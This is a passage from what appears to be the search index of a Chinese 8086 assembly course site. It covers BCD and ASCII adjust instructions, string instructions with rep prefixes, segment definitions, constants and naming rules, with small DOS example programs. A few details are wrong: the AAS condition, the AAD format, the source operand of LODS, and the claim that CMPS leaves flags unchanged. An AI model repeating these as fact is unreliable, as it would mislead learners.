\u538b\u7f29BCD\u7801\u51cf\u6cd5\u7684\u5341\u8fdb\u5236\u8c03\u6574\uff0c\u5c06AL\u8c03\u6574\u56deBCD\u7801<ul> <li>if (af == 1 || (al&amp;0Fh) &gt; 9) al -= 6, af = 1; else af = 0</li> <li>if (cf == 1 || al &gt; 9Fh) al -= 60h, cf = 1; else cf = 0</li> </ul> </li> </ul> <p># \u975e\u538b\u7f29BCD\u7801\u8c03\u6574\u6307\u4ee4</p> <p>AAA</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a aaa</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u52a0\u6cd5\u7684\u00a0ASCII\u00a0\u8c03\u6574\uff0c\u5728\u00a0al\u00a0\u88ab\u505a\u52a0\u6cd5\u540e\u8c03\u6574\u00a0ax\u00a0\u4e3a\u975e\u538b\u7f29BCD\u7801(ah\u4e5f\u88ab\u4fee\u6539)<ul> <li>if (af == 1 || (al&amp;0Fh) &gt; 9) al = (al+6)&amp;0Fh, ah += 1, af = 1, cf = 1</li> <li>else af = 0, cf = 0</li> </ul> </li> </ul> <p>AAS</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a aas</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u51cf\u6cd5\u7684\u00a0ASCII\u00a0\u8c03\u6574\uff0c\u5728\u00a0al\u00a0\u88ab\u505a\u51cf\u6cd5\u540e\u8c03\u6574\u00a0ax\u00a0\u4e3a\u975e\u538b\u7f29BCD\u7801(ah\u4e5f\u88ab\u4fee\u6539)<ul> <li>if (af == 1 || (af&amp;0Fh) &gt; 9) al = (al-6)&amp;0Fh, ah -= 1, af = 1, cf = 1</li> <li>else af = 0, cf = 0</li> </ul> </li> </ul> <p>AAM</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a aam</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4e58\u6cd5\u7684\u00a0ASCII\u00a0\u8c03\u6574\uff0c\u5728\u00a0al\u00a0\u88ab\u505a\u4e58\u6cd5\u540e\u8c03\u6574\u00a0ax\u00a0\u4e3a\u975e\u538b\u7f29BCD\u7801(ah\u4e5f\u88ab\u4fee\u6539)<ul> <li>ah = al / 10, al = al % 10</li> </ul> </li> </ul> <p>AAD</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a aam</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u9664\u6cd5\u7684\u00a0ASCII\u00a0\u8c03\u6574\uff0c\u5728\u00a0al\u00a0\u88ab\u505a\u9664\u6cd5\u540e\u8c03\u6574\u00a0ax\u00a0\u4e3a\u975e\u538b\u7f29BCD\u7801(ah\u4e5f\u88ab\u4fee\u6539)<ul> <li>al = ah * 10 + al, ah = 0</li> </ul> </li> </ul>"},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_14","title":"\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4","text":"<p>\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u5305\u62ec\uff1a</p> <ul> <li><code>movs</code> \u5b57\u7b26\u4e32\u590d\u5236 move string </li> <li><code>cmps</code> \u5b57\u7b26\u4e32\u6bd4\u8f83 compare string</li> <li><code>scas</code> \u5b57\u7b26\u4e32\u641c\u7d22 scan string</li> <li><code>stos</code> \u5199\u5165\u5b57\u7b26\u4e32 store string</li> <li><code>lods</code> \u8bfb\u53d6\u5b57\u7b26\u4e32 load string</li> </ul> <p>\u4e0e\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u76f8\u5173\u7684\u6307\u4ee4\u524d\u7f00\u5305\u62ec\uff1a</p> <ul> <li><code>rep</code> \u91cd\u590d repeat</li> <li><code>repe</code> \u82e5\u76f8\u7b49\u5219\u91cd\u590d repeat if equal</li> <li><code>repz</code> \u82e5\u7ed3\u679c\u4e3a\u96f6\u5219\u91cd\u590d repeat if zero \uff0c\u4e0e <code>repe</code> \u7b49\u6548</li> <li><code>repne</code> \u82e5\u4e0d\u76f8\u7b49\u5219\u91cd\u590d repeat if not equal</li> <li><code>repnz</code> \u82e5\u4e0d\u4e3a\u96f6\u5219\u91cd\u590d repeat if not zero , \u4e0e <code>repne</code> \u7b49\u6548</li> </ul> <p>\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u53ef\u4ee5\u4e0e\u6307\u4ee4\u524d\u7f00\u7ed3\u5408\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u5355\u72ec\u4f7f\u7528\u3002\u5355\u72ec\u4f7f\u7528\u8868\u793a\u4ec5\u6267\u884c\u4e00\u6b21\u5b57\u7b26\u4e32\u64cd\u4f5c\uff0c\u800c\u52a0\u4e86\u6307\u4ee4\u524d\u7f00\u5219\u53ef\u4ee5\u6700\u591a\u91cd\u590d\u6267\u884c CX \u6b21\u3002</p> <p>REP MOVSB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a rep movsb</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u4ece <code>DS:[SI]</code> \u590d\u5236\u5b57\u7b26\u4e32\u5230 <code>ES:[DI]</code><ul> <li>byte ptr ES:[DI] = byte ptr DS:[SI];</li> <li>if(DF == 0) {SI++; DI++} \u5373\u6b63\u5411\u590d\u5236</li> <li>if(DF == 1) {SI--; DI--} \u5373\u53cd\u5411\u590d\u5236</li> <li>CX--; if(CX == 0) goto DONE;</li> </ul> </li> </ul> <p>REPE CMPSB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a repe cmpsb</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u6bd4\u8f83 <code>DS:[SI]</code> \u4e0e <code>ES:[DI]</code> \u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06 SI \u548c DI \u505c\u7559\u5728\u7b2c\u4e00\u6b21\u4e0d\u76f8\u7b49\u7684\u5730\u65b9<ul> <li>cmp byte ptr ES:[DI], byte ptr DS:[SI];</li> <li>if(DF == 0) {SI++; DI++} \u5373\u6b63\u5411\u6bd4\u8f83</li> <li>if(DF == 1) {SI--; DI--} \u5373\u53cd\u5411\u6bd4\u8f83</li> <li>CX--; if(CX == 0 || ZF != 0) goto DONE;</li> </ul> </li> <li>\u6ce8\u610f: <code>CMPS</code> \u6307\u4ee4\u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d\uff0c\u5f53\u9000\u51fa\u8be5\u6307\u4ee4\u65f6\uff0c\u6807\u5fd7\u5bc4\u5b58\u5668 FL \u6062\u590d;\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u7528 <code>je</code> \u7b49\u6307\u4ee4\u5b9e\u73b0\u5224\u65ad\u8df3\u8f6c</li> </ul> <p>\u53ef\u4ee5\u81ea\u5df1\u8bd5\u8bd5\u4e0b\u9762\u7684\u7a0b\u5e8f\u7684\u6267\u884c\u6548\u679c\uff1a</p> <pre><code>comment @\n\u5c06\u5b57\u7b26\u4e32s\u590d\u5236\u5230\u5230t\u4e2d\uff0c\u5e76\u6bd4\u8f83s\u548ct\u662f\u5426\u76f8\u7b49\n@\n\ndata segment\ns db \"I hate Monsterhunter:wild\", 0Dh, 0Ah    ; , '$'\nslen =  $ - offset s\nequal_msg db \"Equal\", 0Dh, 0Ah, '$'\nunequal_msg db \"Not Equal\", 0Dh, 0Ah, '$'\ndata ends\n\nextra segment\nt db slen dup(0)\nextra ends\n\ncode segment\nassume cs:code, ds:data, es:extra\ncompare:\n    mov si, offset s           ; \u4e3a\u4ec0\u4e48\u8fd9\u91cc\u9700\u8981\u91cd\u65b0\u5bf9 si \u548c di \u8d4b\u503c\uff1f movsb \u6307\u4ee4\u5df2\u7ecf\u5bf9\u5176\u8fdb\u884c\u4e86++\u64cd\u4f5c\n    mov di, offset t\n    mov cx, slen\n    repe cmpsb                 ; \u6bd4\u8f83\u5b57\u7b26\u4e32\n    je is_equal\nnot_equal:\n    mov dx, offset unequal_msg\n    jmp output\nis_equal:\n    mov dx, offset equal_msg\noutput:\n    mov ah, 9                  ; \u8f93\u51fa ds:[dx] \u7684\u5b57\u7b26\u4e32\uff0c\u4e00\u76f4\u5230\u9047\u5230 '$'\n    int 21h\n    ret\n\nmain:\n    mov ax, data\n    mov ds, ax\n    mov ax, extra\n    mov es, ax\n    mov si, offset s\n    mov di, offset t\n    mov cx, slen\n    cld                        ; DF = 0\n    rep movsb                  ; \u5b57\u7b26\u4e32\u590d\u5236\n    mov cx, slen\n    mov bx, 0\nL1:\n    mov dl, byte ptr es:[bx]   ; \u53d6\u6570\u636e\uff0c\u4e0d\u80fd\u662f t:[bx]\uff1bbyte ptr \u4e0d\u52a0\u4e5f\u884c\n    mov ah, 2                  ; \u5982\u679c\u5b57\u7b26\u4e32\u4ee5 '$' \u7ed3\u5c3e\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528ah = 9\u8f93\u51fadx\u4e2d\u5b57\u7b26\u4e32\n    int 21h\n    inc bx\n    loopnz L1                  ; CX--,\u82e5cx\u4e0d\u7b49\u4e8e\u96f6\uff0c\u5219\u5faa\u73af\n    call compare\nexit:\n    mov ah, 1h\n    int 21h\n    mov ah, 4ch\n    int 21h\ncode ends\nend main\n</code></pre> <p>$</p> <p>\u8fd9\u91cc\u6570\u636e\u6bb5\u4e2d\u6709\u4e00\u53e5 <code>slen = $ - offset s</code>\uff0c\u4f5c\u7528\u662f\u8ba1\u7b97\u6570\u7ec4 s \u7684\u957f\u5ea6\u3002\u4f46\u662f <code>slen</code> \u672c\u8eab\u4e0d\u4f1a\u51fa\u73b0\u5728\u6570\u636e\u6bb5\u5185\uff0c\u800c\u662f\u7c7b\u4f3c\u4e8e\u5b8f\u7684\u5b58\u5728\u3002</p> <p>REPE SCASB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a repe scasb</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5728 <code>ES:[DI]</code> \u6307\u5411\u7684\u76ee\u6807\u5b57\u7b26\u4e32\u4e2d\u641c\u7d22 AL|AX|EAX \u7684\u503c</li> <li>\u6ce8\u610f: \u57fa\u672c\u539f\u7406\u57fa\u672c\u540c\u4e0a\uff0c\u4e00\u822c\u53ea\u5229\u7528 CX \u524d\u540e\u7684\u53d8\u5316\u6c42\u5b57\u7b26\u4e32\u957f\u5ea6</li> </ul> <p>\u7528 <code>repne scasb</code> \u6c42\u5b57\u7b26\u4e32\u957f\u5ea6\uff1a</p> <pre><code>data segment\ns db \"Sakura no toki\", 0\nslen dw 0\ndata ends\n\ncode segment\nassume cs:code, ds:data\nmain:\n    mov ax, data\n    mov ds, ax\n    mov es, ax\n    mov di, offset s\n    mov cx, 0FFFFh     ; \u6700\u5927\u641c\u7d22\u6b21\u6570\n    xor al, al         ; AL = 0h\n    cld                ; DF = 0\n    repne scasb\n    inc cx             ; 00h \u4e0d\u7b97\u5728\u5b57\u7b26\u4e32\u5185\n    not cx             ; CX = 0FFFFh - CX = \u641c\u7d22\u8fc7\u7684\u5b57\u7b26\u4e2a\u6570\n    mov [slen], cx\n    mov ah, 4Ch\n    int 21h\ncode ends\nend main\n</code></pre> <p>REP STOSB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a rep stosb</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u628a AL|AX|EAX \u7684\u503c\u5199\u5165 <code>ES:[DI]</code> \u6307\u5411\u7684\u76ee\u6807\u5b57\u7b26\u4e32</li> <li>\u6ce8\u610f: \u57fa\u672c\u539f\u7406\u57fa\u672c\u540c\u4e0a</li> </ul> <p>REP LODSB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a rep lodsb</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4ece <code>ES:[DI]</code> \u4e2d\u8bfb\u53d6 x \u4e2a\u5b57\u8282\u4fdd\u5b58\u5728 AL|AX|EAX \u4e2d</li> <li>\u6ce8\u610f: \u57fa\u672c\u539f\u7406\u57fa\u672c\u540c\u4e0a\uff0cx \u4e3a\u5bf9\u5e94\u7684\u5b57\u8282\u957f\u5ea6</li> </ul>"},{"location":"Courses/8086asm/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%BA%90%E7%A8%8B%E5%BA%8F%E6%A0%BC%E5%BC%8F/","title":"\u6c47\u7f16\u8bed\u8a00\u6e90\u7a0b\u5e8f\u683c\u5f0f","text":"<p> \u7ea6 2006 \u4e2a\u5b57  93 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p>"},{"location":"Courses/8086asm/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%BA%90%E7%A8%8B%E5%BA%8F%E6%A0%BC%E5%BC%8F/#_1","title":"\u6bb5\u7684\u5b9a\u4e49\u3001\u5047\u8bbe\u4e0e\u5f15\u7528","text":""},{"location":"Courses/8086asm/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%BA%90%E7%A8%8B%E5%BA%8F%E6%A0%BC%E5%BC%8F/#_2","title":"\u6bb5\u7684\u5b9a\u4e49","text":"<p>\u6bb5\u5b9a\u4e49\u7684\u4e00\u822c\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>segmentname segment [use] [align] [combine] ['class']\n    statements\nsegmentname ends\n</code></pre> <p>\u5176\u4e2d\uff0c\u65b9\u62ec\u53f7\u5185\u90e8\u5206\u662f\u53ef\u9009\u7684\u3002</p> <ul> <li><code>use</code> \u8868\u793a\u6bb5\u5185\u504f\u79fb\u5730\u5740\u5bbd\u5ea6\uff0c\u53ef\u9009\u62e9 <code>use16</code>,<code>use32</code> <ul> <li>\u82e5\u6c47\u7f16\u7a0b\u5e8f\u5f00\u5934\u6709 <code>.386</code> \uff0c\u5219\u9ed8\u8ba4\u4f7f\u7528 <code>use32</code> \uff0c\u4e0d\u60f3\u8981\u7684\u8bdd\u9700\u8981\u624b\u52a8\u52a0\u4e0a <code>use16</code></li> </ul> </li> <li><code>align</code> \u8868\u793a\u5bf9\u5176\u65b9\u5f0f\uff0c\u53ef\u9009\u62e9 <code>byte</code>,<code>word</code>,<code>dword</code>,<code>para</code>,<code>page</code> \uff0c\u7528\u6765\u89c4\u5b9a\u8be5\u6bb5\u7684\u8fb9\u754c\u7684\u5bf9\u9f50\u65b9\u5f0f\uff0c\u5373\u6bb5\u9996\u5730\u5740\u80fd\u88ab <code>align</code> \u6574\u9664<ul> <li><code>para</code> \u662f 16 \u5b57\u8282\uff0c<code>page</code> \u662f 256 \u5b57\u8282\uff0c\u9ed8\u8ba4\u4e3a <code>para</code></li> <li>\u5982\u679c\u524d\u4e00\u4e2a\u6bb5\u672b\u5c3e\u5730\u5740\u4e0d\u80fd\u88ab\u8be5\u6bb5 <code>align</code> \u6574\u9664\uff0c\u8fde\u63a5\u5668\u4f1a\u4ee5 00h \u5bf9\u524d\u4e00\u4e2a\u6bb5\u672b\u5c3e\u8fdb\u884c\u586b\u5145\u3002\u4e00\u822c\u9ed8\u8ba4\u53ea\u8981\u6bb5\u9996\u5730\u5740\u6ee1\u8db3\u5341\u516d\u8fdb\u5236\u6700\u4f4e\u4f4d\u4e3a0\u5373\u53ef\u3002</li> </ul> </li> <li><code>class</code> \u8868\u793a\u7c7b\u522b\u540d\uff0c\u5fc5\u987b\u7528\u5355\u5f15\u53f7\u62ec\u8d77\u6765<ul> <li>\u5177\u6709\u76f8\u540c\u7c7b\u522b\u540d\u7684\u6bb5\u5728\u8fde\u63a5\u65f6\u4f1a\u88ab\u91cd\u65b0\u5b89\u6392\u987a\u5e8f\u4f7f\u5176\u5728 EXE \u7a0b\u5e8f\u4e2d\u90bb\u8fd1</li> </ul> </li> <li><code>combine</code> \u8868\u793a\u5408\u5e76\u7c7b\u578b\uff0c\u53ef\u9009\u62e9 <code>public</code>,<code>stack</code><ul> <li><code>public</code> \u7528\u4e8e\u4ee3\u7801\u6bb5\u6216\u6570\u636e\u6bb5\u7684\u5b9a\u4e49\uff0c\u51e1\u662f\u6bb5\u540d\u3001\u7c7b\u522b\u540d\u90fd\u76f8\u540c\uff0c\u4e14\u5408\u5e76\u7c7b\u578b\u4e3a <code>public</code> \u7684\u6bb5\u5728\u8fde\u63a5\u65f6\u4f1a\u5408\u5e76\u6210\u4e00\u4e2a\u6bb5</li> <li><code>stack</code> \u7528\u4e8e\u5806\u6808\u6bb5\u7684\u5b9a\u4e49\uff0c\u51e1\u662f\u6bb5\u540d\u3001\u7c7b\u522b\u540d\u90fd\u76f8\u540c\u3001\u4e14\u5408\u5e76\u7c7b\u578b\u4e3a <code>stack</code> \u7684\u6bb5\u5728\u8fde\u63a5\u65f6\u4f1a\u5408\u5e76\u6210\u4e00\u4e2a\u5806\u6808\u6bb5</li> <li>\u5982\u679c\u7a0b\u5e8f\u5e76\u4e0d\u5b58\u5728\u540c\u540d\u4ee3\u7801\u6bb5\u6216\u6570\u636e\u6bb5\uff0c\u5219\u53ef\u4ee5\u7701\u7565 <code>public</code> \uff1b\u4f46\u662f\u5806\u6808\u6bb5\u5408\u5e76\u7c7b\u578b\u4e0d\u80fd\u7701\u7565</li> </ul> </li> </ul>"},{"location":"Courses/8086asm/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%BA%90%E7%A8%8B%E5%BA%8F%E6%A0%BC%E5%BC%8F/#_3","title":"\u6bb5\u7684\u5047\u8bbe","text":"<p>\u6c47\u7f16\u6307\u793a\u8bed\u53e5 <code>assume</code> \u53ef\u4ee5\u7528\u6765\u5efa\u7acb\u7f16\u8bd1\u5668\u6240\u9700\u8981\u7684\u6bb5\u4e0e\u6bb5\u5bc4\u5b58\u5668\u7684\u5173\u8054\uff0c\u5176\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>assume segreg:segmentname\n</code></pre> <p><code>segreg</code> \u53ef\u4ee5\u4e3a\u56db\u4e2a\u6bb5\u5bc4\u5b58\u5668\u5176\u4e2d\u4e00\u4e2a\uff0c\u4e00\u822c\u4f7f\u7528\uff1a</p> <pre><code>assume cs:code, ds:data, es:extra, ss:stk\n</code></pre> <p>\u7528 <code>assume</code> \u5efa\u7acb\u6bb5\u5730\u5740\u548c\u6bb5\u5bc4\u5b58\u5668\u7684\u5173\u8054\u5e76\u4e0d\u4ee3\u8868\u5bf9\u6bb5\u5bc4\u5b58\u5668\u7684\u8d4b\u503c\uff0c\u800c\u662f\u5e2e\u52a9\u7f16\u8bd1\u5668\u5728\u7f16\u8bd1\u6e90\u7a0b\u5e8f\u65f6\u628a\u53d8\u91cf\u6216\u6807\u53f7\u7684\u6bb5\u5730\u5740\u66ff\u6362\u6210\u5173\u8054\u7684\u6bb5\u5bc4\u5b58\u5668\uff0c\u4f8b\u5982\uff1a</p> <pre><code>;\u5047\u8bbe\u53d8\u91cf abc \u4f4d\u4e8e data \u6bb5\u504f\u79fb\u5730\u5740\u4e3a 3 \u5904\n   mov ah, [abc]\n=&gt; mov ah, data:[3] ; \u6bb5\u5730\u5740\u4e0d\u80fd\u7528\u5e38\u6570\u8868\u793a\n=&gt; mov ah, ds:[3]   ; After Translation\n</code></pre> <p>\u4f46\u662f\u6bb5\u5bc4\u5b58\u5668 DS \u548c ES \u5728\u7a0b\u5e8f\u5f00\u59cb\u65f6\u4e0d\u4f1a\u88ab\u8d4b\u503c\u4e3a\u9996\u6bb5\u7684\u6bb5\u5730\u5740\uff0c\u800c\u662f\u88ab\u8d4b\u503c\u4e3a PSP \u6bb5\u5740\uff0c\u56e0\u6b64\u4e00\u822c\u5728\u4ee3\u7801\u5f00\u59cb\u505a\u5982\u4e0b\u8d4b\u503c\uff1a</p> <pre><code>mov ax, data\nmov ds, ax\n</code></pre> <p>\u5806\u6808\u6bb5\u53ea\u80fd\u521b\u5efa\u4e00\u6b21\uff0c\u521b\u5efa\u65f6\uff0c<code>ss:[sp]</code> \u6307\u5411\u6808\u9876\uff0c<code>sp</code> \u6307\u5411\u5806\u6808\u6bb5\u7684\u672b\u5c3e(\u5f00\u8f9f\u4e00\u6bb5\u7a7a\u95f4\uff0c\u91cc\u9762\u7684'S'\u53ea\u662f\u7528\u6765\u5360\u4f4d\u7684)</p> <pre><code>stk segment stack ; \u5f00\u8f9f\u4e00\u6bb5\u5806\u6808\u7a7a\u95f4\uff0c\u91cc\u9762\u7684'S'\u53ea\u662f\u7528\u6765\u5360\u4f4d\u7684\na db 200h dup('S')\nstk ends\n\n----\n\n+-------------+ &lt;- ss:[sp], sp = \u5806\u6808\u957f\u5ea6\n|stack segment|\n+-------------+ &lt;- ss:[sp - 200h] or ss\n|code  segment|\n+-------------+ &lt;- cs:[ip], ip = offset main\n|data  segment|\n+-------------+ &lt;- ds\n</code></pre>"},{"location":"Courses/8086asm/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%BA%90%E7%A8%8B%E5%BA%8F%E6%A0%BC%E5%BC%8F/#_4","title":"\u5e38\u6570\u4e0e\u5e38\u6570\u8868\u8fbe\u5f0f","text":"<p>\u6c47\u7f16\u8bed\u8a00\u652f\u6301\u7684\u5e38\u6570\u5305\u62ec\u6574\u578b\u5e38\u6570\u3001\u6d6e\u70b9\u578b\u5e38\u6570\u3001\u5b57\u7b26\u5e38\u6570\u3001\u5b57\u7b26\u4e32\u5e38\u6570\uff0c\u5982\uff1a</p> <pre><code>10110000B       ; \u4e8c\u8fdb\u5236\uff0cB\u4e3a\u540e\u7f00\n177Q, 17777777Q ; \u516b\u8fdb\u5236\uff0cQ\u4e3a\u540e\u7f00\n\ny dq 1.6E-307   ; double \u7c7b\u578b\u6d6e\u70b9\u6570\uff0c\u91c7\u7528\u79d1\u5b66\u8ba1\u6570\u6cd5\n\ns db 'C','I','A','L','L','O'  ; \u7b49\u4ef7 s db \"CIALLO\"\n</code></pre> \u8fd0\u7b97\u7b26 \u683c\u5f0f \u542b\u4e49 + \u7565 \u6b63 or \u52a0 - \u7565 \u8d1f or \u51cf * x * y \u4e58 / x / y \u9664 MOD x MOD y \u53d6\u4f59 SHR x SHR y x \u53f3\u79fb y \u4f4d SHL x SHL y x \u5de6\u79fb y \u4f4d NOT NOT x \u6c42\u53cd AND x AND y \u6c42\u4e0e OR x OR y \u6c42\u6216 XOR x XOR y \u6c42\u5f02\u6216 SEG SEG x \u53d6\u6bb5\u5730\u5740 OFFSET OFFSET x \u53d6\u504f\u79fb\u5730\u5740 <p>\u5e38\u6570\u8868\u8fbe\u5f0f\u4e2d\u53ea\u80fd\u5305\u542b\u8fd0\u7b97\u7b26\u548c\u5e38\u6570\uff0c\u4e0d\u80fd\u542b\u6709\u5bc4\u5b58\u5668\u6216\u53d8\u91cf\u540d</p> <p>\u53e6\u5916\uff0c\u6c47\u7f16\u8bed\u8a00\u8fd8\u652f\u6301\u5b9a\u4e49\u7b26\u53f7\u5e38\u6570\uff08\u7c7b\u4f3c\u5b8f\uff09\uff0c\u5982\uff1a</p> <pre><code>char = 'A'\nexitfun equ &lt;mov ah, 4Ch&gt;\ndosint  equ &lt;int 21h&gt;\ncode segment\nassume cs:code,\nmain:\n    mov ah, 2\n    mov dl, char\n    dosint\n    char = 'B'\n    mov ah, 2\n    mov dl, char\n    dosint\n    exitfun\n    dosint\ncode ends\nend main\n</code></pre> <ul> <li>= \u7684\u64cd\u4f5c\u6570\u53ea\u80fd\u662f\u6570\u503c\u7c7b\u578b\u6216\u5b57\u7b26\u7c7b\u578b\u7684\u5e38\u6570\u6216\u5e38\u6570\u8868\u8fbe\u5f0f\uff0c\u4e14\u53ef\u4ee5\u5bf9\u8be5\u7b26\u53f7\u591a\u6b21\u5b9a\u4e49</li> <li>EQU \u7684\u64cd\u4f5c\u6570\u9664\u4e86\u6570\u503c\u7c7b\u578b\u6216\u5b57\u7b26\u7c7b\u578b\u7684\u5e38\u6570\u6216\u5e38\u6570\u8868\u8fbe\u5f0f\u5916\uff0c\u8fd8\u53ef\u4ee5\u662f\u5b57\u7b26\u4e32\uff0c\u751a\u81f3\u662f\u4e00\u6761\u6c47\u7f16\u8bed\u53e5\uff0c\u4f46\u4e0d\u53ef\u591a\u6b21\u5b9a\u4e49</li> </ul>"},{"location":"Courses/8086asm/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%BA%90%E7%A8%8B%E5%BA%8F%E6%A0%BC%E5%BC%8F/#_5","title":"\u53d8\u91cf\u4e0e\u6807\u53f7","text":"<p>\u53d8\u91cf\u540d\u548c\u6807\u53f7\u540d\u53ef\u4ece <code>0-9a-zA-Z@?$_</code> \u4e2d\u9009\u53d6\uff0c\u5176\u8981\u6c42\u5982\u4e0b\uff1a</p> <ul> <li>\u53d8\u91cf\u540d\u548c\u7b26\u53f7\u540d\u4e0d\u80fd\u4ee5\u6570\u5b57\u5f00\u5934</li> <li><code>$</code> \u548c <code>?</code> \u4e0d\u80fd\u5355\u72ec\u7528\u4f5c\u53d8\u91cf\u540d\u548c\u7b26\u53f7\u540d</li> <li>\u53d8\u91cf\u540d\u548c\u7b26\u53f7\u540d\u6240\u5305\u542b\u5b57\u7b26\u4e0d\u80fd\u8d85\u8fc7 31 \u4e2a</li> <li>\u4e00\u822c\u60c5\u51b5\uff0c\u53d8\u91cf\u540d\u548c\u6807\u53f7\u540d\u90fd\u4e0d\u533a\u5206\u5927\u5c0f\u5199</li> </ul> \u8bf7\u6307\u51fa\u4ee5\u4e0b\u53d8\u91cf\u540d\u4e2d\u54ea\u4e9b\u662f\u4e0d\u6b63\u786e\u7684\uff0c\u5e76\u8bf4\u660e\u9519\u8bef\u539f\u56e0 <ul> <li>(1) aaa\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0; \u6b63\u786e</li> <li>(2) bbb\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0; \u6b63\u786e</li> <li>(3) VIDEO-3D\u00a0\u00a0\u00a0\u00a0\u00a0; \u4e0d\u6b63\u786e\u3002\u53d8\u91cf\u540d\u4e2d\u4e0d\u80fd\u542b\u6709\u51cf\u53f7\u3002</li> <li>(4) It_is_ok!\u00a0\u00a0\u00a0\u00a0; \u4e0d\u6b63\u786e\u3002\u53d8\u91cf\u540d\u4e2d\u4e0d\u80fd\u542b\u6709\u611f\u53f9\u53f7\u3002</li> <li>(5) ?IsItRight\u00a0\u00a0\u00a0; \u6b63\u786e</li> <li>(6) 2Small\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0; \u4e0d\u6b63\u786e\u3002\u53d8\u91cf\u540d\u4e0d\u80fd\u7528\u6570\u5b57\u5f00\u5934\u3002</li> <li>(7) MP2$MP3@MP4\u00a0\u00a0; \u6b63\u786e</li> <li>(8) FFFFh\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0; \u6b63\u786e</li> </ul> <p>\u6807\u53f7\u65f6\u7b26\u53f7\u5f62\u5f0f\u8868\u793a\u7684\u8df3\u8f6c\u76ee\u6807\u5730\u5740\uff0c\u6807\u53f7\u65e2\u53ef\u4ee5\u7528\u4f5c\u8df3\u8f6c\u6307\u4ee4\uff0c\u5982 <code>jmp</code>,<code>jnz</code>,<code>loop</code> \u7684\u76ee\u6807\u5730\u5740\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f5c <code>call</code> \u6307\u4ee4\u7684\u76ee\u6807\u5730\u5740\u3002\u5b9a\u4e49\u6807\u53f7\u7684\u4e00\u822c\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>lablename:\n</code></pre> <p>\u9664\u4e86\u7528\u6807\u53f7\u540d\u52a0\u5192\u53f7\u7684\u5f62\u5f0f\u5b9a\u4e49\u6807\u53f7\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u7528\u4f2a\u6307\u4ee4 <code>label</code> \u6765\u5b9a\u4e49\u6807\u53f7\uff0c\u5176\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>labelname label near|far|byte|word|dword|qword|tbyte\n</code></pre> <p>\u5176\u4e2d <code>near</code>,<code>far</code> \u662f\u7528\u4e8e\u8df3\u8f6c\u7684\u6807\u53f7\u7c7b\u578b\uff0c\u5176\u5b83\u4e94\u4e2a\u5219\u662f\u53d8\u91cf\u7c7b\u578b\u3002</p> <p>\u5b9a\u4e49\u4e00\u4e2a\u6807\u53f7\u4e3a\u8fd1\u6807\u53f7\u8fd8\u662f\u8fdc\u6807\u53f7\u53d6\u51b3\u4e8e\u4ee5\u8be5\u6807\u53f7\u4e3a\u76ee\u6807\u5730\u5740\u7684\u8df3\u8f6c\u6307\u4ee4\u662f\u5426\u4e0e\u5176\u5728\u540c\u4e00\u4e2a\u6bb5\u4e2d\u3002\u8fd1\u6807\u53f7\u548c\u8fdc\u6807\u53f7\u5728\u7f16\u8bd1\u540e\u90fd\u8f6c\u5316\u6210\u5730\u5740\uff0c\u5176\u4e2d\u8fd1\u6807\u53f7\u8f6c\u5316\u4e3a\u5176\u5728\u8be5\u6bb5\u4e2d\u7684\u504f\u79fb\u5730\u5740\uff0c\u800c\u8fdc\u6807\u53f7\u8f6c\u5316\u4e3a\u6bb5\u5730\u5740\uff1a\u504f\u79fb\u5730\u5740\u3002\u56e0\u6b64\uff0c\u5982\u679c\u8df3\u8f6c\u6307\u4ee4\u8981\u5f15\u7528\u522b\u7684\u6bb5\u7684\u6807\u53f7\uff0c\u90a3\u4e48\u8be5\u6807\u53f7\u5e94\u88ab\u5b9a\u4e49\u4e3a\u8fdc\u6807\u53f7\uff0c\u800c\u6307\u4ee4